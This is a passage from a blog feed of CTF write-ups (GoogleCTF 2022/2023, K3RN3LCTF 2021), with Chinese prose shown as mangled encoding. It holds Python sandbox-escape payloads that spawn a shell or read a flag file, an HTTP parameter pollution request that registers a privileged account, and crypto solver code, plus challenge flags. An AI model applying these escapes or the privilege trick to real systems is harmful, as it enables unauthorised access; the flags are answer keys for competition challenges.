<p>é˜…è¯»æºç ,å¯ä»¥å‘ç°:</p>
<ul>
<li><code>flag</code>åœ¨å½“å‰å·¥ä½œç›®å½•ä¸‹ä¸€ä¸ªåä¸º<code>flag</code>çš„æ–‡ä»¶</li>
<li>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>exec</code>æ‰§è¡Œä»»æ„ä»£ç ,ä½†å¿…é¡»é€šè¿‡<code>verify_secure</code>å‡½æ•°çš„æ£€æŸ¥</li>
<li><code>verify_secure</code>ä½¿ç”¨<code>ast</code>æ¨¡å—è¿›è¡Œåˆ†æ,ä¸èƒ½æœ‰æ˜¾å¼çš„å‡½æ•°è°ƒç”¨å’Œå¯¼å…¥è¯­å¥</li>
<li><code>os</code>å’Œ<code>sys</code>æ¨¡å—å¯ç”¨</li>
</ul>
<p>æ€è·¯:</p>
<ul>
<li><code>os</code>æ¨¡å—å·²ç»å¯¼å…¥,æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>os.system()</code>æ–¹æ³•æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li>
<li>å€ŸåŠ©äºPythonæœºåˆ¶,é€šè¿‡éæ˜¾å¼çš„æ–¹å¼åœ°æ¥è°ƒç”¨å‡½æ•°,å¦‚å†…ç½®å‡½æ•°ã€é‡è½½è¿ç®—ç¬¦ã€è§£é‡Šå™¨Hook</li>
</ul>
<p>æˆ‘çš„è§£æ³•:</p>
<p>åœ¨pythonä¸­ä½¿ç”¨<code>in</code>è¿ç®—ç¬¦æ—¶,é»˜è®¤ä¼šè°ƒç”¨<code>__contains__</code>æ–¹æ³•,å¹¶ä¸”ä¼šå°†éœ€è¦åˆ¤æ–­çš„å¯¹è±¡ä½œä¸ºå½¢å‚ä¼ å…¥;</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨<code>os.system</code>è¦†ç›–ç°æœ‰çš„pythonå¯¹è±¡&#x2F;ç±»ä¸Šçš„<code>__contains__</code>æ–¹æ³•,ç„¶åé€šè¿‡è¿ç®—ç¬¦æ¥è°ƒç”¨<code>system</code>å‡½æ•°.</p>
<pre><code class="python">os.environ.__class__.__contains__ = os.system
&#39;cat flag&#39; in os.environ
</code></pre>
<p>å…¶ä»–è§£æ³•:</p>
<ol>
<li><p>è£…é¥°å™¨</p>
<pre><code class="python">@exec
@input
class X:
  pass
</code></pre>
</li>
<li><p>å¼‚å¸¸</p>
<pre><code class="python">class MyException(Exception):
  def __str__(self):
    return &#39;cat flag&#39;

sys.stdout.write=os.system
sys.stderr.write=os.system

raise MyException   
</code></pre>
<pre><code class="python">class X:
    def __init__(self, a, b, c):
        self += &quot;os.system(&#39;sh&#39;)&quot;
    __iadd__ = exec
sys.excepthook = X
1/0
</code></pre>
</li>
<li><p>å…ƒç±»</p>
<pre><code class="python"># This will define the members on the &quot;sub&quot;class
class Metaclass:
    __getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type
    
class Sub(metaclass=Metaclass): # That&#39;s how we make Sub.__class__ == Metaclass
    pass # Nothing special to do

assert isinstance(Sub, Metaclass)
sub[&#39;import os; os.system(&quot;sh&quot;)&#39;]
</code></pre>
</li>
</ol>
<p>å…¶ä»–Writeup</p>
<ul>
<li><a href="https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/">GCTF 2022 Treebox</a></li>
</ul>
<p><strong>flag:</strong><code>CTF&#123;CzeresniaTopolaForsycja&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
        <category>GoogleCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>GoogleCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>GoogleCTF2023 Writeup</title>
    <url>/posts/851556193/</url>
    <content><![CDATA[<h1 id="LEAST-COMMON-GENOMINATOR"><a href="#LEAST-COMMON-GENOMINATOR" class="headerlink" title="LEAST COMMON GENOMINATOR?"></a>LEAST COMMON GENOMINATOR?</h1><p><em>Someone used this program to send me an encrypted message but I can&#39;t read it! It uses something called an LCG, do you know what it is? I dumped the first six consecutive values generated from it but what do I do with it?!</em></p>
<p><em><a href="https://storage.googleapis.com/gctf-2023-attachments-project/4e90c59c2c12ac422f0b83094cca2c3e5c4c7cce464dddc5cb2ad391155f11c96a183290a289dfe1c64cc9e3cd467706f07e621904588ca4def3a4f6906234b7.zip">Attachment</a></em></p>
<hr>
<details>
<summary style="display: list-item;">generate.py</summary>
<div markdown="1">

<pre><code class="python">from secret import config
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, isPrime

class LCG:
    lcg_m = config.m
    lcg_c = config.c
    lcg_n = config.n

    def __init__(self, lcg_s):
        self.state = lcg_s

    def next(self):
        self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n
        return self.state

if __name__ == &#39;__main__&#39;:

    assert 4096 % config.it == 0
    assert config.it == 8
    assert 4096 % config.bits == 0
    assert config.bits == 512

    # Find prime value of specified bits a specified amount of times
    seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635
    lcg = LCG(seed)
    primes_arr = []

    dump = True
    items = 0
    dump_file = open(&quot;dump.txt&quot;, &quot;w&quot;)

    primes_n = 1
    while True:
        for i in range(config.it):
            while True:
                prime_candidate = lcg.next()
                if dump:
                    dump_file.write(str(prime_candidate) + &#39;\n&#39;)
                    items += 1
                    if items == 6:
                        dump = False
                        dump_file.close()
                if not isPrime(prime_candidate):
                    continue
                elif prime_candidate.bit_length() != config.bits:
                    continue
                else:
                    primes_n *= prime_candidate
                    primes_arr.append(prime_candidate)
                    break

        # Check bit length
        if primes_n.bit_length() &gt; 4096:
            print(&quot;bit length&quot;, primes_n.bit_length())
            primes_arr.clear()
            primes_n = 1
            continue
        else:
            break

    # Create public key &#39;n&#39;
    n = 1
    for j in primes_arr:
        n *= j
    print(&quot;[+] Public Key: &quot;, n)
    print(&quot;[+] size: &quot;, n.bit_length(), &quot;bits&quot;)

    # Calculate totient &#39;Phi(n)&#39;
    phi = 1
    for k in primes_arr:
        phi *= (k - 1)

    # Calculate private key &#39;d&#39;
    d = pow(config.e, -1, phi)

    # Generate Flag
    assert config.flag.startswith(b&quot;CTF&#123;&quot;)
    assert config.flag.endswith(b&quot;&#125;&quot;)
    enc_flag = bytes_to_long(config.flag)
    assert enc_flag &lt; n

    # Encrypt Flag
    _enc = pow(enc_flag, config.e, n)

    with open (&quot;flag.txt&quot;, &quot;wb&quot;) as flag_file:
        flag_file.write(_enc.to_bytes(n.bit_length(), &quot;little&quot;))

    # Export RSA Key
    rsa = RSA.construct((n, config.e))
    with open (&quot;public.pem&quot;, &quot;w&quot;) as pub_file:
        pub_file.write(rsa.exportKey().decode())
</code></pre>
</div>
</details>

<p>åˆ†æå¯çŸ¥:</p>
<ul>
<li><p>flagæ˜¯ä½¿ç”¨RSAåŠ å¯†çš„,å·²çŸ¥å…¬ğŸ”‘ æ–‡ä»¶,å³n,e</p>
</li>
<li><p>ä½¿ç”¨LCGçº¿æ€§åŒä½™ç”Ÿæˆå™¨ç”Ÿæˆç´ æ•°</p>
</li>
<li><p>å·²çŸ¥LCGçš„ç§å­å’Œå‰6ä¸ªè¿ç»­ç”Ÿæˆçš„æ•°å­—</p>
</li>
<li><p>config.it &#x3D; 8</p>
</li>
<li><p>config.bits &#x3D; 256</p>
</li>
</ul>
<p>LCGæ˜¯ä¼ªéšæœºæ•°ç”Ÿæˆå™¨å’Œæµå¯†ç çš„ä¸€ç§,é€’æ¨å…¬å¼æ˜¯Â ğ‘‹ğ‘›+1&#x3D;(ğ‘ğ‘‹ğ‘›+ğ‘)Â ğ‘šğ‘œğ‘‘Â ğ‘š</p>
<p>å·²çŸ¥åˆå€¼å’ŒéšåLCGè¿ç»­ç”Ÿæˆçš„6ä¸ªå€¼,æœªçŸ¥å¢é‡ã€ä¹˜æ•°å’Œæ¨¡æ•°.</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ”»å‡»å¾—åˆ°è¿™ä¸‰ä¸ªå€¼,ç„¶åæ¨¡æ‹ŸåŸç®—æ³•é€šè¿‡LCGå¾—åˆ°8ä¸ªç´ æ•°å,è¿›ä¸€æ­¥è®¡ç®—nçš„æ¬§æ‹‰å‡½æ•°å¹¶æ±‚é€†å…ƒå¾—åˆ°d,è§£å¯†å³å¯.</p>
<details>
<summary style="display: list-item;">é¢˜è§£:</summary>
<div markdown="1">

<pre><code class="python">import math
from functools import reduce

import gmpy2

from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, isPrime, long_to_bytes

dump_file = open(&quot;dump.txt&quot;)
output_values = [int(x) for x in dump_file.readlines()]  # å·²çŸ¥çš„ LCG è¾“å‡ºå€¼

def crack_unknown_increment(states, modulus, multiplier):
    &quot;&quot;&quot;
    å·²çŸ¥ï¼ša,m,s0,s1
    æ±‚c
    &quot;&quot;&quot;
    increment = (states[1] - states[0] * multiplier) % modulus
    return modulus, multiplier, increment

def crack_unknown_multiplier(states, modulus):
    &quot;&quot;&quot;
    å·²çŸ¥ï¼šm,s0,s1,s2
    æ±‚a
    &quot;&quot;&quot;
    multiplier = (
        (states[2] - states[1]) * gmpy2.invert(states[1] - states[0], modulus) % modulus
    )  # æ³¨æ„è¿™é‡Œæ±‚é€†å…ƒ
    return crack_unknown_increment(states, modulus, multiplier)

def crack_unknown_modulus(states):
    &quot;&quot;&quot;
    å·²çŸ¥ï¼šs0-s6
    æ±‚a,c,m
    &quot;&quot;&quot;
    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]
    zeroes = [t2 * t0 - t1 * t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
    modulus = abs(reduce(math.gcd, zeroes))
    return crack_unknown_multiplier(states, modulus)

class LCG:
    def __init__(self, lcg_m, lcg_c, lcg_n, lcg_s):
        self.state = lcg_s
        self.lcg_m = lcg_m
        self.lcg_c = lcg_c
        self.lcg_n = lcg_n

    def next(self):
        self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n
        return self.state


m, a, c = crack_unknown_modulus(output_values)
seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635
lcg = LCG(a, c, m, seed)
print(a, c, m)
primes_n = 1
primes_arr = []
for i in range(8):
    while True:
        prime_candidate = lcg.next()
        if not isPrime(prime_candidate):
            continue
        elif prime_candidate.bit_length() != 512:
            continue
        else:
            primes_n *= prime_candidate
            primes_arr.append(prime_candidate)
            break

print(list(primes_arr))

phi = 1
for k in primes_arr:
    phi *= k - 1

key = RSA.importKey(open(&quot;public.pem&quot;, &quot;r&quot;).read())
n = key.n
e = key.e
d = gmpy2.invert(e, phi)

enc = open(&quot;flag.txt&quot;, &quot;rb&quot;).read()

flag = pow(int.from_bytes(enc, &quot;little&quot;), d, n)
print(long_to_bytes(flag))
</code></pre>
</div>
</details>

<p><strong>flag</strong>: <code>CTF&#123;C0nGr@tz_RiV35t_5h4MiR_nD_Ad13MaN_W0ulD_b_h@pPy&#125;</code></p>
<p>å‚è€ƒ:</p>
<ul>
<li><a href="https://www.codercto.com/a/35743.html">æ”»å‡»çº¿æ€§åŒä½™ç”Ÿæˆå™¨(LCG) | ç å†œç½‘</a></li>
<li><a href="https://blog.csdn.net/weixin_45883223/article/details/115299389">LCG(çº¿æ€§åŒä½™ç”Ÿæˆå™¨)_lcgçº¿æ€§åŒä½™_WustHandyçš„åšå®¢-CSDNåšå®¢</a></li>
</ul>
<h1 id="NPC"><a href="#NPC" class="headerlink" title="NPC"></a>NPC</h1><p><em>A friend handed me this map and told me that it will lead me to the flag.<br>It is confusing me and I don&#39;t know how to read it, can you help me out?</em></p>
<p><em><a href="https://storage.googleapis.com/gctf-2023-attachments-project/9a8f5d47fab0a460f9826c4f13aa1dff2809140e68325fb21edab674ee5ec2476b902d2797c41bd6d9311e3510c9366d739d9404e00aa9d4ffd6a0d88e5bf2ef.zip">Attachment</a></em></p>
<hr>
<p>ä½¿ç”¨Graphvizå·¥å…·å°†<code>hint.dot</code>è½¬æ¢ä¸ºå›¾ç‰‡,å¾—åˆ°ä¸‹å›¾</p>
<pre><code class="shell">dot -Tjpg  hint.dot -o hint.jpg
</code></pre>
<img data-src="../../CTF/GoogleCTF2023/Misc/assets/hint.jpg" alt="hint.jpg" width="300">

<p>åˆ†æä»£ç :</p>
<ul>
<li><p>ä»<code>USACONST.TXT</code>ä¸­éšæœºé€‰æ‹©Nä¸ªå•è¯ç”Ÿæˆå¯†ç ,ä½¿ç”¨<code>passphrase.encrypt(secret, password)</code>å¯¹flagåŠ å¯†</p>
</li>
<li><p>å¯¹äº<code>password</code>ä¸­çš„æ¯ä¸ªå­—æ¯,åˆ›å»ºä¸€ä¸ªå¸¦æœ‰å”¯ä¸€IDçš„èŠ‚ç‚¹,å¹¶æ·»åŠ åˆ°å›¾ä¸­</p>
</li>
<li><p>æŒ‰ç…§<code>password</code>çš„é¡ºåº,å¯¹å¯†ç ä¸­ç›¸é‚»çš„ä¸¤ä¸ªå­—ç¬¦åˆ›å»ºä¸€æ¡è¾¹</p>
</li>
<li><p>å‘å›¾ä¸­éšæœºæ·»åŠ <code>int(len(password) ** 1.3)</code>æ¡è¾¹</p>
</li>
<li><p>éšæœºæ‰“ä¹±å›¾ä¸­èŠ‚ç‚¹å’Œè¾¹çš„é¡ºåº</p>
</li>
<li><p>éšæœºäº¤æ¢ä¸€äº›èŠ‚ç‚¹çš„èµ·ç‚¹å’Œç»ˆç‚¹,ç”±äº<code>random() % 2</code>åªæœ‰åœ¨<code>random</code>å‡½æ•°è¿”å›å€¼ä¸º0æ—¶æ‰ä¸º<code>False</code>,æˆ‘ä»¬å‡å®šå›¾ä¸­æ¯æ¡è¾¹çš„èµ·ç‚¹å’Œç»ˆç‚¹éƒ½è¢«äº¤æ¢äº†ä¸€é</p>
</li>
<li><p>å°†èŠ‚ç‚¹å’Œè¾¹çš„ä¿¡æ¯å†™å…¥åˆ°<code>hint.dot</code>æ–‡ä»¶ä¸­</p>
</li>
</ul>
<p>æˆ‘æ˜¯æ€è·¯æ˜¯:</p>
<ol>
<li><p>éå†words_listä¸­çš„å•è¯,ä»æ¯ä¸ªèŠ‚ç‚¹å‡ºå‘,ä½¿ç”¨DFSåˆ¤æ–­æ˜¯å¦å¯ä»¥åœ¨å›¾ä¸­æ‰¾åˆ°,è¿™æ ·è¿‡æ»¤åå¾—åˆ°30ä¸ªå•è¯,å³å¯†ç ä¸€å®šç”±è¯¥30ä¸ªå•è¯ä¸­çš„æŸå‡ ä¸ªå•è¯ç»„æˆ</p>
</li>
<li><p>æšä¸¾å¯†ç ä¸­æ‰€ç”¨çš„å•è¯ä¸ªæ•°N</p>
</li>
<li><p>ä½¿ç”¨ç»„åˆæ•°ä»è¿™30ä¸ªå•è¯é€‰æ‹©Nä¸ªå•è¯</p>
</li>
<li><p>åˆ¤æ–­æ‰€é€‰çš„Nä¸ªå•è¯ç»„æˆçš„å­—ç¬¦é›†å’Œ<code>hint.dot</code>ä¸­çš„å­—ç¬¦é›†æ˜¯å¦ä¸€è‡´</p>
</li>
<li><p>å¯¹Nä¸ªå•è¯è¿›è¡Œå…¨æ’åˆ—,å¹¶å°è¯•è§£å¯† (<em>ä¸ºäº†æé«˜æ•ˆç‡,è¿™é‡Œè¿˜ç”¨åˆ°äº†å¤šè¿›ç¨‹</em>)</p>
</li>
</ol>
<p>å½“N&#x3D;5æ—¶,å¾—åˆ°password<code>standardwatersigngivenchosen</code>å’Œ<code>flag</code>.</p>
<details>
<summary style="display: list-item;">ä»£ç </summary>
<div markdown="1">

<pre><code class="python">import concurrent.futures
import itertools
import re
from collections import Counter

from pyrage import passphrase

from encrypt import get_word_list


class Node:
    def __init__(self, letter):
        self.letter = letter
        self.adjacent = []

    def __str__(self) -&gt; str:
        return f&quot;&#123;self.letter&#125; -&gt; &#123;[x.letter for x in self.adjacent]&#125;&quot;

    __repr__ = __str__

def build_nodes():
    pattern = r&quot;\s+(\d+)\s+\[label=(\w+)\];&quot;
    pattern2 = r&quot;\s+(\d+)\s+--\s+(\d+);$&quot;
    nodes = dict()
    with open(&quot;hint.dot&quot;, &quot;r&quot;) as f:
        for line in f:
            if &quot;label&quot; in line
                match = re.match(pattern, line)
                node_id = match.group(1)
                letter = match.group(2)
                nodes[node_id] = Node(letter)
            elif &quot;--&quot; in line:
                match = re.match(pattern2, line)
                start = match.group(1)
                end = match.group(2)
                # nodes[start].adjacent.append(nodes[end])
                nodes[end].adjacent.append(nodes[start])
    return nodes

visited = set()

def dfs(node, index, word):
    if index == len(word):
        return True

    if node.letter != word[index]:
        return False

    visited.add(node)

    for adj in node.adjacent:
        if adj not in visited:
            if dfs(adj, index + 1, word):
                return True

    visited.remove(node)
    return False

def check(password):
    with open(&quot;secret.age&quot;, &quot;rb&quot;) as f:
        enc = f.read()
    try:
        print(&quot;[FLAG] is &quot;, passphrase.decrypt(enc, password))
        print(&quot;Password is &quot;, password)
    except Exception as e:
        pass


def filter_words(nodes):
    ans = set()
    for word in get_word_list():
        visited.clear()
        for node in nodes.values():
            if dfs(node, 0, word):
                ans.add(word)
                break

    print(&quot;ans:&quot;, len(ans), ans)
    return ans


def main():
    nodes = build_nodes()

    letters = sorted([node.letter for node in nodes.values()])

    ans = filter_words(nodes)
    for num in range(1, len(ans) + 1):
        print(f&quot;Num is &#123;num&#125;&quot;)
        for comb in itertools.combinations(ans, num):  # ç»„åˆ
            if sorted(&quot;&quot;.join(comb)) == letters:
                passwords = [
                    &quot;&quot;.join(perm) for perm in itertools.permutations(comb, len(comb))
                ]

                with concurrent.futures.ProcessPoolExecutor(max_workers=8) as executor:
                    executor.map(check, passwords)


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
</div>
</details>

<p><strong>flag</strong>: <code>CTF&#123;S3vEn_bR1dg35_0f_K0eN1g5BeRg&#125;</code></p>
<p>å‚è€ƒ:</p>
<ul>
<li><a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#processpoolexecutor">concurrent.futures --- å¯åŠ¨å¹¶è¡Œä»»åŠ¡ -- Python 3.11.4 æ–‡æ¡£</a></li>
</ul>
<h1 id="UNDER-CONSTRUCTION"><a href="#UNDER-CONSTRUCTION" class="headerlink" title="UNDER-CONSTRUCTION"></a>UNDER-CONSTRUCTION</h1><p><em>We were building a web app but the new CEO wants it remade in php.</em></p>
<p><em><a href="https://storage.googleapis.com/gctf-2023-attachments-project/22790c2f38bd6adde75753641011c223db7e2c0ec718df6e883976ed9c518ca0a86ef67b7e153fd07a9fa734f6a5350028ca266e3bf646f1096d2c4d536ff45a.zip">Attachment</a></em><br><em><code>https://under-construction-web.2023.ctfcompetition.com</code></em><br><em><code>https://under-construction-php-web.2023.ctfcompetition.com</code></em></p>
<hr>
<p>é¢˜ç›®æä¾›äº†Flaskå’ŒPHPä¸¤ä¸ªç«™ç‚¹,ç”¨æˆ·å¯ä»¥åœ¨Flaskç«™ç‚¹è¿›è¡Œæ³¨å†Œ,æ³¨å†Œçš„è´¦å·å¯ä»¥åŒæ—¶ç”¨äºç™»å½•Flaskå’ŒPHPä¸¤ä¸ªç«™ç‚¹.</p>
<p>åˆ†æä»£ç :</p>
<p>Flaskä¼šå°†HTTPè¯·æ±‚åŸå§‹æŸ¥è¯¢å‚æ•°è½¬å‘åˆ°PHPåº”ç”¨ç¨‹åºä¸­å®Œæˆç”¨æˆ·æ³¨å†Œ.</p>
<pre><code class="python"># File: /flask/authorized_routes.py
@authorized.route(&#39;/signup&#39;, methods=[&#39;POST&#39;])
def signup_post():
    raw_request = request.get_data()
    ...
    requests.post(f&quot;http://&#123;PHP_HOST&#125;:1337/account_migrator.php&quot;, 
        headers=&#123;&quot;token&quot;: TOKEN, &quot;content-type&quot;: request.headers.get(&quot;content-type&quot;)&#125;, data=raw_request)
    return redirect(url_for(&#39;authorized.login&#39;))
</code></pre>
<p>åªæœ‰<code>gold</code>çº§åˆ«çš„ç”¨æˆ·,åœ¨PHPç«™ç‚¹ç™»å½•åæ‰å¯ä»¥çœ‹åˆ°FLAG</p>
<pre><code class="php"># File: /php/index.php
function getResponse()
&#123;
    ...
    $response = &quot;Login successful. Welcome &quot; . htmlspecialchars($username) . &quot;.&quot;;

    if ($tier === &quot;gold&quot;) &#123;
        $response .= &quot; &quot; . getenv(&quot;FLAG&quot;);
    &#125;

    return $response;
&#125;
</code></pre>
<p>Flaskä¼šå¯¹æŸ¥è¯¢å‚æ•°è¿›è¡Œæ ¡éªŒ,é˜²æ­¢åˆ›å»ºé«˜æƒé™çš„ç”¨æˆ·.</p>
<pre><code class="python"># File: /flask/authorized_routes.py
@authorized.route(&#39;/signup&#39;, methods=[&#39;POST&#39;])
def signup_post():
    ...
Â Â Â Â tier = models.Tier(request.form.get(&#39;tier&#39;))
    if(tier == models.Tier.GOLD):
        flash(&#39;GOLD tier only allowed for the CEO&#39;)
        return redirect(url_for(&#39;authorized.signup&#39;))
    ...
</code></pre>
<p>HTTPæŸ¥è¯¢å‚æ•°ä¸­å­˜åœ¨é‡å¤çš„keyæ—¶,åœ¨Flaskå’ŒPHPæœ‰ä¸åŒçš„è¡Œä¸º,flaskä¼šå–ç¬¬ä¸€ä¸ªå€¼,è€ŒPHPä¼šå–æœ€åä¸€ä¸ªå€¼.</p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹å‘½ä»¤,ä»¥æ­¤ç»•è¿‡Flaskå¯¹æŸ¥è¯¢å‚æ•°çš„æ ¡éªŒ,å¹¶åœ¨PHPä¸­æ³¨å†Œé«˜æƒé™ç”¨æˆ·.</p>
<p><strong>curl</strong></p>
<pre><code class="shell">curl -X POST https://under-construction-web.2023.ctfcompetition.com/signup -d &quot;username=admin&amp;password=admin&amp;tier=blue&amp;tier=gold&quot;
</code></pre>
<p>ç„¶åç”¨ä¸Šè¿°çš„ç”¨æˆ·åå’Œå¯†ç å»PHPç«™ç‚¹ç™»å½•å³å¯.</p>
<p><strong>flag</strong>: <code>CTF&#123;ff79e2741f21abd77dc48f17bab64c3d&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
        <category>GoogleCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>GoogleCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>K3RN3LCTF2021 Writeup</title>
    <url>/posts/3427623925/</url>
    <content><![CDATA[<h1 id="3in1"><a href="#3in1" class="headerlink" title="3in1"></a>3in1</h1><p><em>Description</em><br><em>Like Nescafeeeee!</em></p>
<p><em>Attachments</em></p>
<p><em><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py</a></em></p>
<hr>
<p>åˆ†æä»£ç ,å‘ç°æ˜¯AESåŠ å¯†,å¯†é’¥ä¸º<code>hkey</code></p>
<pre><code class="python">password = (&quot;abda&quot;)    
hash_obj = SHA256.new(password.encode(&#39;utf-8&#39;))    
hkey = hash_obj.digest()

def decrypt(info):
    cipher = AES.new(hkey, AES.MODE_ECB)
    result = cipher.decrypt(info)
    return result
msg =  b&#39;\x1bkw\x00\x01#\x1dv\xd1\x1e\xfb\xba\xac_b\x02T\xfbZ\xca\xac8Y\\8@4\xba;\xe1\x11$\x19\xe8\x89t\t\xc8\xfd\x93\xd8-\xba\xaa\xbe\xf1\xa0\xab\x18\xa0\x12$\x9f\xdb\x08~\x81O\xf0y\xe9\xef\xc41\x1a$\x1cN3\xe8F\\\xef\xc1G\xeb\xdb\xa1\x93*F\x1b|\x1c\xec\xa3\x04\xbf\x8a\xd9\x16\xbc;\xd2\xaav6pWX\xc1\xc0o\xab\xd5V^\x1d\x11\xe4&#125;6\xa4\x1b\\G\xd4e\xc2mP\xdb\x9b\x9f\xb0Z\xf12&#39;

print(decrypt(msg))
</code></pre>
<p>AESè§£å¯†å¾—åˆ°ä¸¤ä¸ªurl,è®¿é—®urlå¾—åˆ°æ–‡ä»¶<code>hint.txt</code>å’Œ<code>flag.wav</code></p>
<pre><code class="python">b&#39;https://www.mediafire.com/file/oii1sm3oyt4tyjc/flag.wav/file\nhttps://www.mediafire.com/file/rgdww91os3we7eo/hint.txt/file&#39;
</code></pre>
<p>æŸ¥çœ‹<code>hint.txt</code>,æç¤ºæˆ‘ä»¬â€œå›¾å½¢æˆ–ç…§ç‰‡è¡¨ç¤ºâ€</p>
<pre><code>A graphic or photographic representation 
</code></pre>
<p>ä½¿ç”¨<a href="https://www.sonicvisualiser.org/download.html">Sonic Visualiser</a>æ‰“å¼€<code>flag.wav</code>,ç‚¹å‡»<code>Layer</code>-&gt;<code>Add Spectrogram</code>,å¾—åˆ°flag</p>
<p><img data-src="/../../CTF/K3RN3LCTF2021/Crypto/images/image-20211119215941779.png" alt="image-20211119215941779"></p>
<p><strong>flag:</strong><code>flag&#123;34sY_CH4LL3nGe_w1tH_3Xtr4_St3Ps&#125;</code></p>
<h1 id="Progressive-Dynamite"><a href="#Progressive-Dynamite" class="headerlink" title="Progressive Dynamite"></a>Progressive Dynamite</h1><p>Find the minimal sum of numbers on a path from the top left corner to the bottom right corner. You can only go right or down in each move.</p>
<p><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Progressive-Dynamite/challenge.txt</a></p>
<hr>
<p>é¢˜ç›®ç»™äº†ä¸€ä¸ªåŒ…å«è´Ÿæ•´æ•°çš„ç½‘æ ¼,è¦æ±‚æˆ‘ä»¬æ‰¾åˆ°ä¸€æ¡ä»ç½‘æ ¼å·¦ä¸Šè§’å…ƒç´ åˆ°å³ä¸‹è§’å…ƒç´ çš„è·¯å¾„,ä½¿å¾—è·¯å¾„ä¸Šçš„æ•°å­—æ€»å’Œæœ€å°.</p>
<p>å‚ç…§<a href="https://leetcode-cn.com/problems/minimum-path-sum/solution/zui-xiao-lu-jing-he-by-leetcode-solution/">Leetcode-æœ€å°è·¯å¾„å’Œ</a>,æ˜¯ä¸€é“å…¸å‹çš„åŠ¨æ€è§„åˆ’é¢˜,ä»£ç å¦‚ä¸‹:</p>
<pre><code class="python">from Crypto.Util.number import *
from challenge import grid

rows, columns = len(grid), len(grid[0])
dp = [[0] * columns for _ in range(rows)]
dp[0][0] = grid[0][0]
for i in range(1, rows):
    dp[i][0] = dp[i - 1][0] + grid[i][0]
for j in range(1, columns):
    dp[0][j] = dp[0][j - 1] + grid[0][j]
for i in range(1, rows):
    for j in range(1, columns):
        dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i][j]
print(dp[rows - 1][columns - 1])
print(long_to_bytes(dp[-1][-1]))
</code></pre>
<p><strong>flag:</strong><code>flag&#123;dyn4m1c_pr0gramm1ng_pr0!&#125;</code></p>
<h1 id="Vieta-s-Poly"><a href="#Vieta-s-Poly" class="headerlink" title="Vieta&#39;s Poly"></a>Vieta&#39;s Poly</h1><p>Here&#39;s a pwntools tutorial challenge to get you warmed up!</p>
<p>nc ctf.k3rn3l4rmy.com 2236</p>
<p><a href="https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py">https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/Vietas-Poly/template.py</a></p>
<hr>
<p>é¢˜ç›®ç»™äº†ä¸€ä¸ªå¤šé¡¹å¼,è¦æ±‚æˆ‘ä»¬è®¡ç®—:</p>
<ul>
<li>æ ¹çš„å’Œ</li>
<li>æ ¹çš„å€’æ•°çš„å’Œ</li>
<li>æ ¹çš„å¹³æ–¹çš„å’Œ</li>
</ul>
<p>è§£æå‡ºå¤šé¡¹å¼ç³»æ•°,å€ŸåŠ©<code>numpy.poly1d</code>æ„é€ å¤šé¡¹å¼,å³å¯è®¡ç®—å‡ºæ ¹,è¿›ä¸€æ­¥è®¡ç®—å¾—åˆ°æ‰€éœ€ç»“æœ(éœ€è¦ä¿ç•™ä¸¤ä½å°æ•°)</p>
<p>ä»£ç :</p>
<pre><code class="python">from math import ceil
from pwn import *
import numpy as np

context.log_level = &#39;debug&#39;
conn = remote(&#39;ctf.k3rn3l4rmy.com&#39;, 2236)

def get_input():
    input = conn.recvline().strip().decode()
    return input

def parse(polynomial):
    &#39;&#39;&#39;
    TODO: Parse polynomial
    For example, parse(&quot;x^3 + 2x^2 - x + 1&quot;) should return [1,2,-1,1]
    &#39;&#39;&#39;
    pattern = re.compile(r&quot;([-]?\d+?)x\^\d+&quot;)
    ls = pattern.findall(polynomial.replace(&quot; &quot;,&#39;&#39;))
    ls.insert(0, 1)
    return list(map(int, ls))

for _ in range(4):
    get_input()
for i in range(100):
    type = get_input()
    coeffs = parse(get_input())
    ans = -1
    Q = np.poly1d(coeffs, r=False)
    xs = np.roots(Q)
    if &#39;sum of the roots&#39; in type:
        ans = xs.sum()
    elif &#39;sum of the reciprocals of the roots&#39; in type:
        ans = (1/xs).sum()
    elif &#39;sum of the squares of the roots&#39; in type:
        ans = np.power(xs,2).sum()
    ans = ceil(round(ans.real,2))
    conn.sendline(str(ans))
    get_input()
conn.interactive()
</code></pre>
<p><strong>flag:</strong><code>flag&#123;Viet4s_f0r_th3_win&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
